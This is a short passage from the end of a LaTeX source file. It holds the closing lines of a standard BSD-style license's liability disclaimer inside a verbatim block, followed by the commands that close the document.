(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
\end{verbatim}}

\end{document}
